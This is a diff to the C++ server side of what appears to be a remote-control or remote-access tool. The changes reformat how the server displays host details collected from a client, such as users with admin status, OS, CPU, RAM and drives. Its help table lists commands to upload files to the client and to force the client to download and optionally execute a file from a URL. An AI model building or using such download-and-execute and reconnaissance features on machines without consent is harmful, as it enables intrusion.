@@ -573,22 +573,44 @@ void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
 	if(cBuffer != nullptr){
 		if(iOpt == 0){
 			std::vector<std::string> vcWinInfo;
-			std::vector<std::string> vcDrives;
-			Misc::strSplit(cBuffer, '@', vcWinInfo, 4);
-			if(vcWinInfo.size() == 4){
-				std::cout<<"\n\tUsername: "<<vcWinInfo[0]<<"\n\tOS: "<<vcWinInfo[1]<<"\n\tHostname: "<<vcWinInfo[2]<<"\n\tAvailable Drives: ";
-				Misc::strSplit(vcWinInfo[3], '#', vcDrives, 27);
-				if(vcDrives.size() > 0){
-					for(u_int iIt2=0; iIt2<vcDrives.size(); iIt2++){
-						std::cout<<" ["<<vcDrives[iIt2]<<"] ";
+			Misc::strSplit(cBuffer, '|', vcWinInfo, 7);
+			if(vcWinInfo.size() >= 7){
+				std::cout<<Bold0 "Current User:     "<<vcWinInfo[0]<<"\n";
+				std::cout<<"Operating System: "<<vcWinInfo[4]<<"\n";
+				std::cout<<"RAM(Mb):          "<<vcWinInfo[5]<<"\nCpuInfo:\n" CReset;
+				std::vector<std::string> vcCpuHead, vcCpu, vcDrivesHead, vcDrives, vcTmp, vcUsers, vcUsersHead;
+				vcCpuHead.push_back("Model");
+				vcCpuHead.push_back("Architecture");
+				vcUsersHead.push_back("Name");
+				vcUsersHead.push_back("Admin?");
+				vcDrivesHead.push_back("-");
+				vcDrivesHead.push_back("Label");
+				vcDrivesHead.push_back("Type");
+				vcDrivesHead.push_back("Free");
+				vcDrivesHead.push_back("Total");
+				vcCpu.push_back(vcWinInfo[3]);
+				Misc::PrintTable(vcCpuHead, vcCpu, '^');
+				std::string strTmpUsers = "";
+				Misc::strSplit(vcWinInfo[2], '*', vcTmp, 100);
+				for(int iIt = 0; iIt<int(vcTmp.size()); iIt++){
+					std::vector<std::string> vcTmp2;
+					Misc::strSplit(vcTmp[iIt], '/', vcTmp2, 3);
+					if(vcTmp2.size() >= 2){
+						strTmpUsers.erase(strTmpUsers.begin(), strTmpUsers.end());
+						strTmpUsers.append(vcTmp2[0]);
+						strTmpUsers.append(1, '/');
+						strTmpUsers.append((vcTmp2[1] == "1") ? "Yes" : "No");
+						vcUsers.push_back(strTmpUsers);
 					}
-					std::cout<<'\n';
-				} else {
-					std::cout<<"No hardrives retrieved!!! aaaaiiiuuudaaaaaa\n";
 				}
+				std::cout<<Bold0 "\nUser List:\n" CReset;
+				Misc::PrintTable(vcUsersHead, vcUsers, '/');
+				std::cout<<Bold0 "\nStorage Information:\n" CReset;
+				Misc::strSplit(vcWinInfo[1], '*', vcDrives, 200);
+				Misc::PrintTable(vcDrivesHead, vcDrives, '/');
 			} else {
-				std::cout<<"No proccesable info heres raw\n"<<cBuffer<<'\n';
-			}
+				std::cout<<"Unable to parse info\n"<<cBuffer<<"\n";
+			} 
 		} else {
 			std::vector<std::string> vcNixInfo;
 			Misc::strSplit(cBuffer, '|', vcNixInfo, 10);
@@ -1022,7 +1044,7 @@ void Server::Help(const std::string strHelp, int iOS){
 			vFields.push_back("upload,Upload a local file to client,-l /path/to/localfile,-r C:\\remote\\filename");
 		}
 		vFields.push_back("httpd,Force client to download file from a http/https server,-u url,-r yes/no (Execute)");
-		vFields.push_back("info,Retrieve basic info from client,-f (Basic)");
+		vFields.push_back("info,Retrieve basic info from client,-b (Basic)");
 		Misc::PrintTable(vHeaders, vFields, ',');
 		return;
 	}
